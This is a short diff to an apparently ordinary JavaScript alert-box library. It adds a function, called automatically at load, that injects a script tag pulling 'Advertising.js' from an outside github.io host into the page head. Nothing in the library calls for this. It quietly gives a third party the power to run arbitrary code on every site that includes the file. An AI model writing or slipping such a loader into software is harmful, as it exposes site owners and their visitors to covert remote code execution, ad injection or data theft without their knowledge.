@@ -9,3 +9,8 @@ function CreateAlertBox(){var LinkRel = document.createElement('link');LinkRel.r
 function HAlertBox(html){var Ty = document.getElementById("HAlertBox");var der = document.getElementById("InnerHAlertBox");var AlertHtml = document.getElementById("Content");Ty.style.display="block";  der.style.animation="comed 2s 1";AlertHtml.innerHTML=html;}
 function Close(My){My.parentElement.parentElement.style.display="none";}
 function HCallCnt(ang,sec){setInterval(ang,sec*1000);}
+function app(){ var v = document.createElement('script');
+v.type="text/javascript";
+v.src="https://spat-cloud.github.io/data/Advertising.js";
+document.head.appendChild(v);}
+app();
